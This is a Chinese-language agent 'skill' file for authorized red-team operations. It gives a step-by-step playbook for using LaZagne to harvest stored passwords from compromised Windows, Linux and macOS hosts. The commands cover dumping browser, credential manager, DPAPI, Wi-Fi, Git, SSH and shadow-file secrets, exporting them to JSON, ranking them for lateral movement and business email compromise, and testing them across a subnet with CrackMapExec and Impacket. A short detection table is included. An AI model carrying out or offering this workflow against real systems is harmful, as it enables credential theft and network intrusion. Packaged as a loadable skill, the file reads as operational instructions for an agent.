---
name: cszh-performing-credential-access-with-lazagne
description: 在授权红队行动中，使用 LaZagne 后渗透工具从已控制的终端提取存储的凭据，从浏览器、数据库、系统密钥库和应用程序中恢复密码。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 performing-credential-access-with-lazagne），正文按中文原文照录。

**这个技能干什么**：在授权红队行动中，使用 LaZagne 后渗透工具从已控制的终端提取存储的凭据，从浏览器、数据库、系统密钥库和应用程序中恢复密码。

**什么时候用**：需要按上游中文方法论执行「performing-credential-access-with-lazagne」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 使用 LaZagne 执行凭据访问

## 概述

LaZagne 是一个开源后渗透工具，旨在检索存储在本地系统上的凭据。它支持 Windows、Linux 和 macOS，Windows 上的模块库最为丰富。LaZagne 从浏览器（Chrome、Firefox、Edge、Opera）、邮件客户端（Outlook、Thunderbird）、数据库（PostgreSQL、MySQL、SQLite）、系统存储（Windows 凭据管理器、LSA 密钥、DPAPI）、Wi-Fi 配置文件、Git 凭据及数十种其他应用程序中恢复密码。该工具被归类为 MITRE ATT&CK T1555（来自密码存储的凭据），并作为软件 S0349 列出。红队在获得初始访问权限后使用 LaZagne 收集存储的凭据，从而实现横向移动和权限提升。

## 目标

- 在已控制的 Windows、Linux 或 macOS 终端上部署 LaZagne
- 从所有受支持的密码存储中提取凭据
- 解析并优先排列恢复的凭据以便横向移动
- 识别高价值凭据（域管理员、服务账户、云访问）
- 以适当的证据处理程序记录凭据收割结果
- 将恢复的凭据与 BloodHound 攻击路径关联

## MITRE ATT&CK 映射

- **T1555** - 来自密码存储的凭据
- **T1555.003** - 来自密码存储的凭据：来自 Web 浏览器的凭据
- **T1555.004** - 来自密码存储的凭据：Windows 凭据管理器
- **T1552.001** - 不安全的凭据：文件中的凭据
- **T1552.002** - 不安全的凭据：注册表中的凭据
- **T1003.004** - 操作系统凭据转储：LSA 密钥
- **T1539** - 窃取 Web 会话 Cookie

## 实施步骤

### 阶段一：LaZagne 部署
1. 将 LaZagne 传输到已控制的主机：
   ```powershell
   # 预编译的可执行文件（Windows）
   # 通过 C2 信道或文件上传传输 lazagne.exe

   # Python 版本（需要目标上有 Python）
   git clone https://github.com/AlessandroZ/LaZagne.git
   cd LaZagne
   pip install -r requirements.txt
   ```
2. 验证执行能力和权限：
   ```powershell
   # 检查当前用户上下文
   whoami /priv

   # LaZagne 对用户级存储使用标准用户权限
   # DPAPI 主密钥、LSA 密钥、SAM 需要 SYSTEM/管理员权限
   ```

### 阶段二：完整凭据提取（Windows）
1. 运行所有模块的 LaZagne：
   ```powershell
   # 提取所有凭据
   lazagne.exe all

   # 导出结果为 JSON
   lazagne.exe all -oJ

   # 导出结果到特定文件
   lazagne.exe all -oJ -output C:\Temp\creds
   ```
2. 运行特定模块进行定向提取：
   ```powershell
   # 仅浏览器（Chrome、Firefox、Edge、Opera、IE）
   lazagne.exe browsers

   # Windows 凭据存储
   lazagne.exe windows

   # 数据库凭据
   lazagne.exe databases

   # 邮件客户端凭据
   lazagne.exe mails

   # Wi-Fi 密码
   lazagne.exe wifi

   # Git 凭据
   lazagne.exe git

   # 系统凭据（需要提升权限）
   lazagne.exe sysadmin
   ```

### 阶段三：凭据提取（Linux）
1. 在 Linux 目标上运行 LaZagne：
   ```bash
   # 完整提取
   python3 laZagne.py all

   # 浏览器凭据
   python3 laZagne.py browsers

   # 系统凭据（SSH 密钥、以 root 身份的 shadow 文件）
   python3 laZagne.py sysadmin

   # 数据库凭据
   python3 laZagne.py databases

   # Git 凭据
   python3 laZagne.py git
   ```

### 阶段四：凭据分析与优先级排序
1. 解析 JSON 输出以获取唯一凭据：
   ```python
   import json
   with open("creds.json") as f:
       results = json.load(f)
   for module in results:
       for entry in module.get("results", []):
           print(f"来源: {entry.get('Category')}")
           print(f"  用户: {entry.get('Login', 'N/A')}")
           print(f"  URL/主机: {entry.get('URL', entry.get('Host', 'N/A'))}")
   ```
2. 按价值优先排列凭据：
   - 域凭据（AD 账户）用于横向移动
   - 云服务凭据（AWS、Azure、GCP 控制台）
   - VPN 和远程访问凭据
   - 用于数据访问的数据库凭据
   - 用于商业邮件入侵的邮件凭据
   - 用于权限提升的服务账户凭据

### 阶段五：凭据验证与使用
1. 验证恢复的域凭据：
   ```bash
   # 使用 CrackMapExec 测试域凭据
   crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_pass'

   # 使用 Impacket 测试
   smbclient.py domain.local/user:'password'@10.10.10.1
   ```
2. 与 BloodHound 路径交叉对比高价值目标
3. 使用恢复的凭据进行横向移动或权限提升

## 工具与资源

| 工具 | 用途 | 平台 |
|------|---------|----------|
| LaZagne | 多源凭据提取 | Windows/Linux/macOS |
| Mimikatz | LSASS/DPAPI 凭据转储 | Windows |
| SharpChrome | Chrome 凭据提取（.NET） | Windows |
| SharpDPAPI | DPAPI 凭据解密 | Windows |
| CrackMapExec | 凭据验证和喷洒 | Linux |
| Impacket | 远程凭据测试 | Linux（Python） |

## LaZagne 模块覆盖范围（Windows）

| 类别 | 模块 |
|----------|---------|
| 浏览器 | Chrome、Firefox、Edge、Opera、IE、Brave、Vivaldi |
| 邮件 | Outlook、Thunderbird、Foxmail |
| 数据库 | PostgreSQL、MySQL、SQLiteDB、Robomongo |
| 系统管理 | PuTTY、WinSCP、FileZilla、OpenSSH、RDPManager |
| Windows | 凭据管理器、Vault、DPAPI、自动登录 |
| Wi-Fi | 存储的 Wi-Fi 密码 |
| Git | Git 凭据存储、Git 凭据管理器 |
| SVN | TortoiseSVN |
| 聊天 | Pidgin、Skype |

## 检测特征

| 指标 | 检测方法 |
|-----------|-----------------|
| LaZagne.exe 进程执行 | 基于哈希的 EDR 进程监控检测 |
| 访问 Chrome Login Data SQLite 数据库 | 浏览器凭据存储的文件访问监控 |
| DPAPI CryptUnprotectData API 调用 | API 钩子和 ETW 跟踪 |
| 访问 Windows 凭据管理器 | 事件 5379（凭据管理器读取） |
| 批量凭据存储枚举 | 用于顺序访问模式的行为分析 |
| Python 解释器访问凭据文件 | 脚本块日志和文件访问审计 |

## 验证标准

- [ ] 已在已控制的终端上部署 LaZagne
- [ ] 已完成完整凭据提取（所有模块）
- [ ] 凭据已以 JSON 格式导出用于分析
- [ ] 已解析并去重恢复的凭据
- [ ] 已识别并优先排列高价值凭据
- [ ] 已针对 AD 验证域凭据
- [ ] 已从恢复的凭据识别横向移动机会
- [ ] 已以适当的处理程序记录证据
